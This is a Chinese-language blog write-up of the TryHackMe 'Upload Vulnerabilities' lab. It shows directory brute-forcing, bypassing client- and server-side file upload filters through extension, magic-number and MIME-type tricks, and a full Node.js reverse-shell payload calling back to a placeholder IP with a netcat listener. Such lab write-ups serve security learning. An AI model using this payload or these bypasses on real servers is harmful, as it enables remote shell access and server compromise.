---
author: lemonxym
title: Tryhackme "Upload Vulnerabilities" Challenge
---

P.S. 看了hint或看了别人怎么做的地方加粗表示

未来要加强的方向：

1. 学习BurpSuite的各种option
2. 虚拟机、VPN、本地的IP地址

# 1. 先把gobuster跑起来

扫网站的文件目录

```
gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

发现这几个文件目录

![image-20220525180841880]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220525180841880.png)

只有admin能进

![image-20220525181045006]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220525181045006.png)

# 2. 确定网站使用框架或语言

可以用firefox插件wappalyzer

打开浏览器代理，用Burpsuite抓包，查看返回包的server或x-powered-by

发现

![image-20220525165514862]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220525165514862.png)

搜Express x-powered-by，这个Express代表的是Express.js

# 3. 绕过client-side过滤

## 3.1 过滤规则

看源码，有一个upload.js

![image-20220525170302844]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220525170302844.png)

这里做了三个check

![image-20220525170358215]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220525170358215.png)

需要小于50KB，有magic number检查，文件类型只取第一个.后的拓展名，必须是jpg或者jpeg

## 3.2 找上传文件的路径

**没想到**

查看网站的背景来源，来自/content这个文件夹，但是直接进这个文件夹进不去

![image-20220526140735495]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526140735495.png)

![image-20220526140835451]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526140835451.png)

看了hint，说要上传一个正常的jpeg文件，然后用task中给的wordlist来找这个文件。

![image-20220526141033088]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526141033088.png)![image-20220526141049688]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526141049688.png)

下载wordlist，然后传到攻击机上，我用了https://send-anywhere.com/这个网站来传，非常方便。然后传一个正常的jpeg图片（其实Jpg也可以的），然后用gobuster找/content文件

```
gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 250 -x .jpeg,.jpg
```

后面有一大堆错误，不过找到了

![image-20220526142600472]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526142600472.png)

直接访问是刚才上传的jpeg文件，不过我当时传的是jpeg，现在变成.jpg了耶

![image-20220526144030066]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526144030066.png)

## 3.3 绕过（自己的方法）

1. 先找个express.js的reverse shell文件

我找的是这个网站：https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "YOUR_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

2. 保存为jpg扩展名（绕过check file extensions）

![image-20220526151215793]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526151215793.png)

3. 修改magic number（绕过check magic number）

正确做法：

在文件头加4个A，然后用Hexedit（查看文件十六进制格式的工具，安装用apt install hexedit）来修改成jpg对应的magic number

![image-20220526151508230]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526151508230.png)

查询https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5，发现jpg的magic number是ff d8 ff e0。

![image-20220526151712557]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526151712557.png)

错误做法：

直接把这个乱码放文件头

![image-20220526151923849]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526151923849.png)

绕不过去

![image-20220526152008022]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526152008022.png)

用hexedit查看，发现根本就不是ff d8 ff e0。

![image-20220526152113823]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526152113823.png)

原文件是

![image-20220526152534068]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526152534068.png)

可以看到原文件开头是28，而修改magic后的文件是到第7个十六进制数才出现28，所以我们从网页上复制下来的那三位的乱码，不是四个二位十六进制数，而是六个，所以我们得先加AAAA再修改。

用正确做法是传出去了

![image-20220526150933206]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526150933206.png)

## *3.3 绕过（别人的方法）

**没想到**

直接把收到的js删掉就可以了，但是我抓包的时候没有看到有返回upload.js就不知道怎么删掉，充分暴露了我对Burpsuite不熟悉的问题。我还以为他有什么高级的方法隐藏了js代码呢。

在这里修改，添加对Js文件的介入（intercept）

![image-20220526160308679]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526160308679.png)

别忘了前面的enabled取消掉

![image-20220526161009466]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526161009466.png)

看到对upload.js的请求，介入它的response

![image-20220526160922794]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526160922794.png)

之前浏览器已经缓存了upload.js，所以返回304错误，到这我才明白为什么Hint说到304错误啊...

![image-20220526161150651]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526161150651.png)

![image-20220526161307182]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220526161307182.png)

按ctrl+f5 强制要求网页全面刷新即可。

# 4. 绕过server-side过滤

## 4.1 enumeration

task 10提到了一些用来测试服务器端过滤规则的方法：

先找到一个能按正常流程上传的文件，然后

1. file extension规则：修改后缀为.invalitfileextention或其他什么几乎不可能是文件后缀名的后缀，然后上传。如果成功说明file extenstion过滤是黑名单过滤，否则为白名单过滤
2. magic number规则：将文件的前几个字符改成不可上传的文件的前几个字符。这个task我改成了shell.js的前四个字符（.js文件没有magic number，前四个字符是文件内容的hex值）。如果能上传，表示没有magic number过滤，否则就有。
3. MIME type规则：以下的type域为MIME type

![image-20220527143732385]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220527143732385.png)

上传合法的文件并抓包，修改type为: application/x-javascript或其他不合法类型。如果失败，则表明有MIME type过滤，否则无。

4. file size规则：作者说慢慢传大一点的文件直到遇到不能上传，我是觉得可以取一个小的，一个大的，大的不成功就取大的1/2大小的上传，这样比较快。



最后查出来这个task是file extenstion白名单过滤，没有magic Number过滤，有MIME type过滤。

我自己有个问题就是：我上传一个js文件，抓包，改MIME type为jpg，但是用gobuster找是找不到js文件的，还是变成了jpg文件。我估计是服务器重命名直接把后缀改了，但不确定。



## 4.2 绕过

只要把shell.js文件改为shell.jpg文件，上传时抓包，改MIME type为jpg文件。

然后gobuster找到修改后的文件名，我的是OVO.jpg

执行

```
nc -lvnp 443
```

监听，去到admin那访问刚才的reverse shell文件

![image-20220527155326820]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220527155326820.png)

![image-20220527155413035]({{ site.url }}{{ site.baseurl }}/assets/images/2022-05-25-Tryhackme Upload Vulnerability big task/image-20220527155413035.png)



PS：如果用openvpn连接且用虚拟机的，一定要记得Openvpn装在虚拟机内，而不是本地主机上！！最后这步我是一直收不到，就是因为这个，其实刚用tryhackme的时候网站就说了，但我没注意，用了browser-based的攻击机，但是网太慢了，点击反应实在太慢，而且每次只能保持两个小时，超时里面的东西全部清空了。忍了几个月终于忍不下去了才换openvpn。

